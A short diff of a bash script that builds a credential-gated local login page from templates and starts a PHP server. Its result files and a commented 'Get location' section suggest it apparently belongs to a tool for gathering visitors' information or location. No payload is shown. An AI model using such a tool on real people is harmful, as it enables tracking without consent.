@@ -83,12 +83,12 @@ fi
 #<<<::::Create logger::::>>>#
 rm -rf $CWD/assets/index.html >/dev/null 2>&1
 while read -r M; do
-    echo ${M//€BHUTUUUNAME/$uname}
+    echo ${M//€UNAME/$uname}
 done < $CWD/assets/loggerDummy > $CWD/assets/logger2
 while read -r N; do
-    echo ${N//€BHUTUUPASS/$password}
+    echo ${N//€PASS/$password}
 done < $CWD/assets/logger2 > $CWD/assets/index.html
-rm -rf logger2 >/dev/null 2>&1
+rm -rf $CWD/assets/logger2 >/dev/null 2>&1
 #declare some variables
 Infos="$CWD/assets/send/php/info.txt"
 Result="$CWD/assets/send/php/result.txt"
@@ -125,8 +125,6 @@ done < $CWD/assets/serverDummy > $CWD/assets/server.html
 #start web login
 php -S 127.0.0.1:8084 >> $CWD/logs/phpLogin.txt 2>&1 &
 printf "\n${S2}[${S5}+${S2}] ${S4}Login servet started at ${S1}:: ${S2}http://127.0.0.1:8084 ${R0}\n"
-printf "\n${S4}Username to login ${S1}:: ${S2}Your Name :)${R0}\n"
-printf "${S4}Password to login ${S1}:: ${S2}dearsuman${R0}\n"
 xdg-open http://127.0.0.1:8084
 #<<<---Get location--->>>#
 #while true; do
